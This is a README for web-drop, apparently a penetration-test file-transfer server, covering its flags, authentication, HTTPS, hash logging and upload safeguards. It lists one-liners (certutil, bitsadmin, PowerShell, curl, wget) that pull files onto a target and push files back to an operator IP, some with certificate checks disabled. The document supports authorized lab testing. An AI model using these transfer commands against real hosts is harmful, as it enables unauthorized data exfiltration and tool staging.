# web-drop

[![CI](https://github.com/BBARIBEAU1/web-drop/actions/workflows/ci.yml/badge.svg)](https://github.com/BBARIBEAU1/web-drop/actions/workflows/ci.yml)

> **Authorized use only.** web-drop is a file-transfer server for penetration tests you are allowed to run: a Hack The Box machine, a range you own, or an engagement with written permission. Do not point it at a network or host you are not allowed to test.

web-drop runs on the operator's machine (typically Kali) and gives lab targets a place to download files from and upload files to. It is HTTP on purpose, so the clients already on a Windows or Linux host can do the transfer: PowerShell, certutil, bitsadmin, curl, wget, and Python. It is part of the same spider-themed toolset as taran-tula, ara-gog, arac-hne, shelob, and spinneret.

The runtime is the Python 3.10+ standard library. pytest and ruff are development dependencies only.

## Install

```bash
pipx install git+https://github.com/BBARIBEAU1/web-drop.git
web-drop --help
```

From a clone:

```bash
python -m pip install -e ".[dev]"
```

## Serve a directory

```bash
web-drop serve --dir ./loot --port 8000
```

That creates `./loot` if it is missing, listens on `0.0.0.0:8000`, and prints a reachable URL when `tun0` has an address (otherwise the primary interface). Useful flags:

| Flag | Default | Purpose |
| --- | --- | --- |
| `--port` | `8000` | Listen port. `0` asks the OS for a free port. |
| `--dir` | `./loot` | Directory that is listed, downloaded, and uploaded into. |
| `--bind` | `0.0.0.0` | Local address. Use `127.0.0.1` to keep it on the box. |
| `--password` | unset | Require a password. `WEB_DROP_PASSWORD` is used when the flag is omitted. |
| `--https` | off | Serve HTTPS with a self-signed certificate. |
| `--max-size` | `512M` | Largest accepted upload. `512M`, `2G`, and `4096` all work. Units are powers of 1024. |
| `--log` | `DIR/.web-drop/transfers.jsonl` | JSONL transfer log. |
| `--no-banner` | off | Skip the startup banner. |

A browser pointed at the listener gets a file list and an upload form. `GET /name` downloads that file. Uploads are `POST` (a browser form or `curl -F`) or `PUT` (`curl -T`, `Invoke-RestMethod -Method PUT`).

## One-liners

On the operator box, print commands with the lab address filled in:

```bash
web-drop oneliners --file notes.txt
web-drop oneliners --ip 10.10.14.5 --port 8000 --file notes.txt --password 'lab-secret'
```

`--ip auto` (the default) uses the IPv4 address on `tun0` when that interface exists, and otherwise the primary outbound address. `--file` is the name targets will use. If it is a path to a local file of at most 48 KiB, the base64 fallback at the bottom includes the bytes.

The blocks below are exactly what `web-drop oneliners --ip 10.10.14.5 --file notes.txt` prints for the common clients. Add `--https` and `--password` on a real run so the commands match the listener.

### Windows

Download:

```powershell
Invoke-WebRequest -Uri 'http://10.10.14.5:8000/notes.txt' -OutFile 'notes.txt'
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5:8000/notes.txt', 'notes.txt')
```

```bat
certutil.exe -urlcache -split -f "http://10.10.14.5:8000/notes.txt" "notes.txt"
certutil.exe -urlcache -split -f "http://10.10.14.5:8000/notes.txt" delete

bitsadmin /transfer webdrop /download /priority foreground "http://10.10.14.5:8000/notes.txt" "%CD%\notes.txt"
```

`certutil` and `bitsadmin` can download only. They cannot upload.

Upload:

```powershell
Invoke-RestMethod -Uri 'http://10.10.14.5:8000/notes.txt' -Method PUT -InFile 'notes.txt'
Invoke-RestMethod -Uri 'http://10.10.14.5:8000/notes.txt' -Method POST -InFile 'notes.txt'
Invoke-WebRequest -Uri 'http://10.10.14.5:8000/notes.txt' -Method PUT -InFile 'notes.txt'
(New-Object Net.WebClient).UploadFile('http://10.10.14.5:8000/', 'notes.txt')
```

For HTTPS, PowerShell 7 can take `-SkipCertificateCheck`. Windows PowerShell 5.1 needs the certificate callback that `web-drop oneliners --https` prints. That callback accepts any certificate. Use it only against your own lab listener.

### Linux

Download:

```bash
curl -L -o 'notes.txt' 'http://10.10.14.5:8000/notes.txt'
wget -O 'notes.txt' 'http://10.10.14.5:8000/notes.txt'
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.10.14.5:8000/notes.txt", "notes.txt")'
```

Upload:

```bash
curl -T 'notes.txt' 'http://10.10.14.5:8000/notes.txt'
curl -F 'file=@notes.txt' 'http://10.10.14.5:8000/'
wget -O - --post-file='notes.txt' 'http://10.10.14.5:8000/notes.txt'
```

HTTPS equivalents add `curl -k` and `wget --no-check-certificate`. The generated Python lines use an unverified TLS context in that case.

### Browser

Open `http://<ip>:8000/`. With a password set, the browser prompts for HTTP basic auth (any username, the password you configured; `webdrop` is the conventional username). After that, the form upload and the download links work. With a query token, open `http://<ip>:8000/?token=...` so the form keeps the token.

### Base64, when the target cannot reach you

`web-drop oneliners --file ./notes.txt` embeds a small file between `WEB_DROP_B64` markers, with a `base64 -d` heredoc for Linux and `[IO.File]::WriteAllBytes` for PowerShell. Larger files are not inlined; the command tells you to run `base64 -w0` locally and paste the result. This is the copy-paste fallback, not a transfer through the listener.

## Authentication

When a password is set, every request must carry it. Any one of these is accepted:

| Method | Example |
| --- | --- |
| HTTP basic | `curl -u webdrop:PASSWORD` (any username) |
| Bearer | `Authorization: Bearer PASSWORD` |
| Header | `X-WebDrop-Token: PASSWORD` |
| Query | `?token=PASSWORD` |

Basic auth and the headers are the better choices. The query token exists so certutil and bitsadmin, which cannot set headers, can still authenticate. It is percent-encoded in the generated commands. It will show up in shell history and in the browser address bar. The transfer log stores the filename, not the request URL, so the token is not written to the JSONL file.

An empty password is rejected. Leaving the password unset on `0.0.0.0` prints a warning: anyone who can reach the port can list, download, and upload.

Prefer the environment variable so the password is not in the process list:

```bash
WEB_DROP_PASSWORD='lab-secret' web-drop serve --dir ./loot
```

A `--password` flag overrides the variable.

## HTTPS

```bash
web-drop serve --https --password "$WEB_DROP_PASSWORD"
```

The certificate is written under `${XDG_DATA_HOME:-~/.local/share}/web-drop/` and reused on the next run. The private key is mode `0600`.

- If `openssl` is on `PATH`, it generates a unique self-signed certificate (`CN=web-drop`).
- If `openssl` is not available, web-drop generates one in pure Python and says so at startup. Install openssl when you want the system TLS library to create the key.

Either certificate is untrusted. Targets have to skip verification (`curl -k`, `wget --no-check-certificate`, or the PowerShell callback). TLS here is so the bytes are not trivially visible to everything else on the lab segment. It does not prove the server's identity.

## Integrity

Each successful upload and download is printed and appended to the JSONL log:

```json
{"timestamp":"2026-11-21T20:30:00.000Z","source_ip":"10.10.16.4","method":"PUT","direction":"upload","filename":"notes.txt","size":12,"sha256":"...","md5":"...","status":201}
```

Compare the file you received with the log. Trust SHA-256. MD5 is recorded because `certutil -hashfile notes.txt MD5` is still the check a lot of lab notes use.

```bash
sha256sum loot/notes.txt
```

```powershell
Get-FileHash -Algorithm SHA256 .\notes.txt
```

The response body of an upload is JSON with the stored name and both digests, which is what you want when a name collision renamed the file.

## Limits and refusals

- **No overwrite.** `notes.txt` uploaded again is stored as `notes-1.txt`, then `notes-2.txt`. For `archive.tar.gz` the counter goes before the last suffix: `archive.tar-1.gz`. A symlink is never followed or replaced.
- **Path traversal is rejected**, not flattened. `../`, encoded dots, backslashes, absolute paths, null bytes, nested paths, and hidden names (`.bashrc`) get `400` and nothing is written. A Windows device name such as `CON.txt` is stored as `CON_.txt`. `report.txt:stream` loses the NTFS stream separator.
- **The log and dotfiles are not listed or downloaded.** The default log lives at `loot/.web-drop/transfers.jsonl`. A `--log` path inside the drop directory is also hidden, and an upload is not allowed to take that path.
- **Size.** The file itself must be within `--max-size`. A multipart body may be up to 1 MiB larger than that, for boundaries and headers. Over the limit is `413`, and the partial file is removed.
- **No DELETE.** The listener does not remove files. Clean the directory yourself.
- Give it a dedicated directory. Do not point `--dir` at a home directory or a project tree.

Rejected names are not echoed to the terminal, so a weird filename cannot smuggle terminal control sequences into the operator's session.

There are no screenshots in the repo. The interface is the terminal banner plus one HTML page; both are produced by the commands above.

## Development

```bash
python -m pip install -e ".[dev]"
pytest
ruff check src tests
```

GitHub Actions runs ruff and pytest on Python 3.10, 3.11, and 3.12.

## Roadmap

- **Go client binary.** A single static binary a target can download when the built-in clients are awkward.
- **Base64 chunked mode.** Split a file into small pasteable chunks for a channel that will not pass a raw HTTP body.
- **spinneret integration.** Hand the listener's host, port, and log path to spinneret so the engagement notes record the drop server.

## License

[MIT](LICENSE). Copyright (c) 2026 BBARIBEAU1.
